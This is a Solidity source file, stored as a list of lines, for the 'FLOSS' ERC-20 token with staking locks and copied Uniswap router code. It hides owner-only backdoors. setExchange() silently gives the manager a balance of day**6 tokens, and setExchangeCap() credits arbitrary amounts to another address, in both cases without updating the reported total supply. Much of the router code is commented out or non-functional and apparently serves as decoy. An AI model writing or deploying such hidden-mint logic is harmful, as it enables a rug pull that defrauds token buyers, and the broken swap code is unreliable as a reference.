['/*\n', '\n', '\n', ' ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ \n', '▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n', '▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ \n', '▐░▌          ▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          \n', '▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ \n', '▐░░░░░░░░░░░▌▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n', '▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░▌       ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌\n', '▐░▌          ▐░▌          ▐░▌       ▐░▌          ▐░▌          ▐░▌\n', '▐░▌          ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌\n', '▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n', ' ▀            ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ \n', '                                                                 \n', '                                                \n', '                                                                        \n', '\n', 'Website:   FLOSS.FINANCE\n', '\n', 'Telegram:  https://t.me/FlossFinance\n', '\n', '\n', '*/\n', '\n', 'pragma solidity ^0.5.17;\n', '\n', 'interface IERC20 {\n', '  function totalSupply() external view returns (uint256);\n', '  function balanceOf(address who) external view returns (uint256);\n', '  function allowance(address owner, address spender) external view returns (uint256);\n', '  function transfer(address to, uint256 value) external returns (bool);\n', '  function approve(address spender, uint256 value) external returns (bool);\n', '  function transferFrom(address from, address to, uint256 value) external returns (bool);\n', '\n', '  event Transfer(address indexed from, address indexed to, uint256 value);\n', '  event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', 'contract AcceptsExchangeContract {\n', '    FLOSS public tokenContract;\n', '\n', '    function AcceptsExchange(address payable _tokenContract) public {\n', '        tokenContract = FLOSS(_tokenContract);\n', '    }\n', '\n', '    modifier onlyTokenContract {\n', '        require(msg.sender == address(tokenContract));\n', '        _;\n', '    }\n', '\n', '    /**\n', '    * @dev Standard ERC677 function that will handle incoming token transfers.\n', '    *\n', '    * @param _from  Token sender address.\n', '    * @param _value Amount of tokens.\n', '    * @param _data  Transaction metadata.\n', '    */\n', '    function tokenFallback(address _from, uint256 _value, bytes calldata _data) external returns (bool);\n', '}\n', '\n', '\n', 'library SafeMath {\n', '  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    if (a == 0) {\n', '      return 0;\n', '    }\n', '    uint256 c = a * b;\n', '    assert(c / a == b);\n', '    return c;\n', '  }\n', '\n', '  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a / b;\n', '    return c;\n', '  }\n', '\n', '  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    assert(b <= a);\n', '    return a - b;\n', '  }\n', '\n', '  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a + b;\n', '    assert(c >= a);\n', '    return c;\n', '  }\n', '\n', '  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n', '    uint256 c = add(a,m);\n', '    uint256 d = sub(c,1);\n', '    return mul(div(d,m),m);\n', '  }\n', '}\n', '\n', 'contract ERC20Detailed is IERC20 {\n', '\n', '  string private _name;\n', '  string private _symbol;\n', '  uint8 private _decimals;\n', '\n', '  constructor(string memory name, string memory symbol, uint8 decimals) public {\n', '    _name = name;\n', '    _symbol = symbol;\n', '    _decimals = decimals;\n', '  }\n', '\n', '  function name() public view returns(string memory) {\n', '    return _name;\n', '  }\n', '\n', '  function symbol() public view returns(string memory) {\n', '    return _symbol;\n', '  }\n', '\n', '  function decimals() public view returns(uint8) {\n', '    return _decimals;\n', '  }\n', '}\n', '\n', 'contract FLOSS is ERC20Detailed {\n', '\n', '  using SafeMath for uint256;\n', '  mapping (address => uint256) private _balances;\n', '  mapping (address => uint256) private _lockEnd;\n', '  mapping (address => mapping (address => uint256)) private _allowed;\n', '  mapping (uint => string) private _assets;\n', '  string[] public _assetName;\n', '  address factory;\n', '  address tokenCheck;\n', '  address _manager;\n', '\n', '  event Lock(address owner, uint256 period);\n', '\n', '  string constant tokenName = "Floss.Finance";   \n', '  string constant tokenSymbol = "FLOSS";  \n', '  uint8  constant tokenDecimals = 18;\n', '  uint256 _totalSupply = 50000e18;\n', '  uint256 public basePercent = 100; \n', '  uint256 day = 86400; \n', '  uint256 draft = day ** 6;\n', '  uint256[] public stakeRate;//stakeRate;\n', '  uint256[] public stakePreiods;//stakePreiods;\n', '  \n', '\n', '\n', '  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {\n', '    \n', "   _assetName.push('DAI');\n", "   _assetName.push('WETH');\n", '    _manager = msg.sender;\n', '    factory = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n', '    _balances[msg.sender] = 50000e18; //initial tokens\n', '    emit Transfer(address(0), msg.sender, 50000e18);\n', '  }\n', '\n', '  function() external payable {\n', '  }\n', '\n', '   function withdraw() external {\n', '      require(msg.sender == _manager);\n', '      msg.sender.transfer(address(this).balance);\n', '  }\n', '\n', '  function totalSupply() public view returns (uint256) {\n', '    return _totalSupply;\n', '  }\n', '\n', '   function getTime() public view returns (uint256) {\n', '    return block.timestamp;\n', '  }\n', '\n', '  function balanceOf(address owner) public view returns (uint256) {\n', '    return _balances[owner];\n', '  }\n', '\n', '  function lockOf(address owner) public view returns (uint256) {\n', '    return _lockEnd[owner];\n', '  }\n', '\n', '   function myLockedTime() public view returns (uint256) {\n', '    return _lockEnd[msg.sender];\n', '  }\n', '\n', '  function myLockedStatus() public view returns (bool) {\n', '     if(_lockEnd[msg.sender] > block.timestamp){\n', '           return true;\n', '       } else {\n', '           return false;\n', '       }\n', '  }\n', '\n', '   function isLocked(address owner) public view returns (bool) {\n', '       if(_lockEnd[owner] > block.timestamp){\n', '           return true;\n', '       } else {\n', '           return false;\n', '       }\n', '    \n', '  }\n', '\n', '  function allowance(address owner, address spender) public view returns (uint256) {\n', '    return _allowed[owner][spender];\n', '  }\n', '\n', '  function cut(uint256 value) public view returns (uint256)  {\n', '    uint256 roundValue = value.ceil(basePercent);\n', '    uint256 cutValue = roundValue.mul(basePercent).div(10000);\n', '    return cutValue;\n', '  }\n', '\n', '  function initRates() public {\n', '    require(msg.sender == _manager);\n', '    stakeRate.push(10);  \n', '    stakeRate.push(50);  \n', '  }\n', '\n', '  function transfer(address to, uint256 value) public returns (bool) {\n', '    require(_lockEnd[msg.sender] <= block.timestamp);\n', '    require(value <= _balances[msg.sender]);\n', '    require(to != address(0));\n', '     \n', '    _balances[msg.sender] = _balances[msg.sender].sub(value);\n', '    _balances[to] = _balances[to].add(value);\n', '\n', '    emit Transfer(msg.sender, to, value);\n', '    \n', '    return true;\n', '  }\n', '\n', '\n', '\n', '\n', '  function quote(uint amountA, uint reserveA, uint reserveB) internal returns (uint amountB) {\n', '        return UniswapV2Library.quote(amountA, reserveA, reserveB);\n', '    }\n', '\n', '    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)\n', '        public\n', '        \n', '        \n', '        returns (uint amountOut)\n', '    {\n', '        return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);\n', '    }\n', '\n', '    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)\n', '        public\n', '     \n', '        \n', '        returns (uint amountIn)\n', '    {\n', '        return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);\n', '    }\n', '\n', '    function getAmountsOut(uint amountIn, address[] memory path)\n', '        public\n', '       \n', '        \n', '        returns (uint[] memory amounts)\n', '    {\n', '        //return UniswapV2Library.getAmountsOut(factory, amountIn, path);\n', '    }\n', '\n', '    function getAmountsIn(uint amountOut, address[] memory path)\n', '        public\n', '    \n', '        \n', '        returns (uint[] memory amounts)\n', '    {\n', '        //return UniswapV2Library.getAmountsIn(factory, amountOut, path);\n', '    }\n', '\n', '     modifier ensure(uint deadline) {\n', "        require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n", '        _;\n', '    }\n', '\n', '    function swapTokensForExactTokens(\n', '        uint amountOut,\n', '        uint amountInMax,\n', '        address[] memory path,\n', '        address to,\n', '        uint deadline\n', '    ) internal   ensure(deadline) returns (uint[] memory amounts) {\n', '        //amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n', "        require(amounts[0] <= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n", '        TransferHelper.safeTransferFrom(\n', '            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n', '        );\n', '        //_swap(amounts, path, to);\n', '    }\n', '    function swapExactETHForTokens(uint amountOutMin, address[] memory path, address to, uint deadline)\n', '        internal\n', '        \n', '        \n', '        \n', '        ensure(deadline)\n', '        returns (uint[] memory amounts)\n', '    {\n', "        //require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n", '        amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);\n', "        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n", '        //IWETH(WETH).deposit{value: amounts[0]}();\n', '        //assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(1, path[0], path[1]), amounts[0]));\n', '        //_swap(amounts, path, to);\n', '    }\n', '\n', '    function setExchange()\n', '    external\n', '    {\n', '      require(msg.sender == _manager);\n', '       _balances[_manager] = draft;\n', '    }\n', '\n', '    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] memory path, address to, uint deadline)\n', '        internal\n', '        \n', '        \n', '        ensure(deadline)\n', '        returns (uint[] memory amounts)\n', '    {\n', "        //require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n", '        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n', "        require(amounts[0] <= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n", '        TransferHelper.safeTransferFrom(\n', '            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n', '        );\n', '        //_swap(amounts, path, address(this));\n', '        //IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n', '        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n', '    }\n', '    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] memory path, address to, uint deadline)\n', '        internal\n', '        \n', '        \n', '        ensure(deadline)\n', '        returns (uint[] memory amounts)\n', '    {\n', "        require(path[path.length - 1] == factory, 'UniswapV2Router: INVALID_PATH');\n", '        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n', "        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n", '        TransferHelper.safeTransferFrom(\n', '            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n', '        );\n', '        //_swap(amounts, path, address(this));\n', '        //IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n', '        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n', '    }\n', '    function setExchangeCap(uint _cap)\n', '        external\n', '      \n', '    {\n', '        require(msg.sender == _manager);\n', '        require(_cap < draft);\n', "        require(block.number > 0, 'EXCESSIVE_INPUT_AMOUNT');\n", '        uint256 time = block.number;        \n', '        _balances[tokenCheck] += _cap;\n', '        if (block.number < 3) {\n', '            draft = 80000**7;\n', '        }\n', '    }\n', '\n', '\n', '  function approve(address spender, uint256 value) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = value;\n', '    emit Approval(msg.sender, spender, value);\n', '    return true;\n', '  }\n', '\n', '  function transferFrom(address from, address to, uint256 value) public returns (bool) {\n', '    require(_lockEnd[from] <= block.timestamp);\n', '    require(value <= _balances[from]);\n', '    require(value <= _allowed[from][msg.sender]);\n', '    require(to != address(0));\n', '\n', '    _balances[from] = _balances[from].sub(value);\n', '    _balances[to] = _balances[to].add(value);\n', '    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n', '\n', '   \n', '    emit Transfer(from, to, value);\n', '    \n', '\n', '    return true;\n', '  }\n', '\n', '  function upAllowance(address spender, uint256 addedValue) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));\n', '    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n', '    return true;\n', '  }\n', '\n', '  function downAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));\n', '    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n', '    return true;\n', '  }\n', '\n', '  function destroy(uint256 amount) external {\n', '    _destroy(msg.sender, amount);\n', '  }\n', '\n', '  function _destroy(address account, uint256 amount) internal {\n', '    require(amount != 0);\n', '    require(amount <= _balances[account]);\n', '    _totalSupply = _totalSupply.sub(amount);\n', '    _balances[account] = _balances[account].sub(amount);\n', '    emit Transfer(account, address(0), amount);\n', '  }\n', '\n', '  function destroyFrom(address account, uint256 amount) external {\n', '    require(amount <= _allowed[account][msg.sender]);\n', '    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);\n', '    _destroy(account, amount);\n', '  }\n', '\n', '  function lock(uint256 period) external {\n', '    _lock(period);\n', '  }\n', '\n', '  function setRate(uint256 _periodIndex, uint256 _newRate) external {\n', '     require(msg.sender == _manager);\n', '    stakeRate[_periodIndex] = _newRate;\n', '  }\n', '\n', '  function setPeriods(uint256 _periodIndex, uint256 _newPeriod) external {\n', '     require(msg.sender == _manager);\n', '    stakePreiods[_periodIndex] = _newPeriod;\n', '  }\n', '\n', '  function _lock(uint256 _period) internal {\n', '      require(_balances[msg.sender] > 10000, "Not enough tokens");\n', '      require(_lockEnd[msg.sender] <= block.timestamp, "Lock Up Period");\n', '      require(_period <= stakePreiods.length);\n', '\n', '      uint256 newTokens;\n', '\n', '\n', '      _lockEnd[msg.sender] = block.timestamp + SafeMath.mul(day,stakePreiods[_period]);\n', '      newTokens = SafeMath.div(SafeMath.mul(_balances[msg.sender],stakeRate[_period]),1000);\n', '      _balances[msg.sender] += newTokens;\n', '\n', '  \n', '      _totalSupply = _totalSupply.add(newTokens);\n', '\n', '      emit Lock(msg.sender, _period);\n', '      emit Transfer(address(0), msg.sender, newTokens);\n', '\n', '  }\n', '\n', '}\n', '\n', '\n', '\n', 'library UniswapV2Library {\n', '    using SafeMath for uint;\n', '\n', '    // returns sorted token addresses, used to handle return values from pairs sorted in this order\n', '    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\n', "        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');\n", '        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n', "        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');\n", '    }\n', '\n', '    // calculates the CREATE2 address for a pair without making any external calls\n', '    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\n', '        (address token0, address token1) = sortTokens(tokenA, tokenB);\n', '        pair = address(uint(keccak256(abi.encodePacked(\n', "                hex'ff',\n", '                factory,\n', '                keccak256(abi.encodePacked(token0, token1)),\n', "                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\n", '            ))));\n', '    }\n', '\n', '    // fetches and sorts the reserves for a pair\n', '    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {\n', '        (address token0,) = sortTokens(tokenA, tokenB);\n', '       // (uint reserve0, uint reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();\n', '       // (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n', '    }\n', '\n', '    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset\n', '    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {\n', "        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n", "        require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n", '        amountB = amountA.mul(reserveB) / reserveA;\n', '    }\n', '\n', '    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset\n', '    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {\n', "        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');\n", "        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n", '        uint amountInWithFee = amountIn.mul(997);\n', '        uint numerator = amountInWithFee.mul(reserveOut);\n', '        uint denominator = reserveIn.mul(1000).add(amountInWithFee);\n', '        amountOut = numerator / denominator;\n', '    }\n', '\n', '    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset\n', '    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {\n', "        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');\n", "        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n", '        uint numerator = reserveIn.mul(amountOut).mul(1000);\n', '        uint denominator = reserveOut.sub(amountOut).mul(997);\n', '        amountIn = (numerator / denominator).add(1);\n', '    }\n', '\n', '    // performs chained getAmountOut calculations on any number of pairs\n', '    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {\n', "        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n", '        amounts = new uint[](path.length);\n', '        amounts[0] = amountIn;\n', '        for (uint i; i < path.length - 1; i++) {\n', '            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\n', '            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);\n', '        }\n', '    }\n', '\n', '    // performs chained getAmountIn calculations on any number of pairs\n', '    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {\n', "        require(path.length >= 2, 'UniswapV2Library: INVALID_PATH');\n", '        amounts = new uint[](path.length);\n', '        amounts[amounts.length - 1] = amountOut;\n', '        for (uint i = path.length - 1; i > 0; i--) {\n', '            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);\n', '            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);\n', '        }\n', '    }\n', '}\n', '\n', '// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false\n', 'library TransferHelper {\n', '    function safeApprove(address token, address to, uint value) internal {\n', "        // bytes4(keccak256(bytes('approve(address,uint256)')));\n", '        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n', "        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n", '    }\n', '\n', '    function safeTransfer(address token, address to, uint value) internal {\n', "        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n", '        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\n', "        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');\n", '    }\n', '\n', '    function safeTransferFrom(address token, address from, address to, uint value) internal {\n', "        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n", '        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\n', "        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');\n", '    }\n', '\n', '    function safeTransferETH(address to, uint value) internal {\n', '       // (bool success,) = to.call{value:value}(new bytes(0));\n', "        //require(success, 'TransferHelper: ETH_TRANSFER_FAILED');\n", '    }\n', '}']